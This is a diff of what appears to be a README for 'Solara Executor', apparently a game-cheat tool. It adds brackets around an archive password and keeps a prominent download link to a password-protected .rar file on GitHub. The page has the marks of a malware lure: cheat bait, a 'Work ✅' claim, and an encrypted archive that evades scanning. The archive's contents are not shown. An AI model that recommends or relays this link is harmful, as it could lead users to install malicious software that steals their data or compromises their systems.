@@ -2,7 +2,7 @@
 
 Status: Work ✅
 
-Password 🔑 - H!21JSAh@w21
+Password 🔑 - [H!21JSAh@w21]
 
 👉 [Click here to download](https://github.com/jeffadr13/Solara-Executor/releases/download/Solara/Solara.rar) 👈  
 
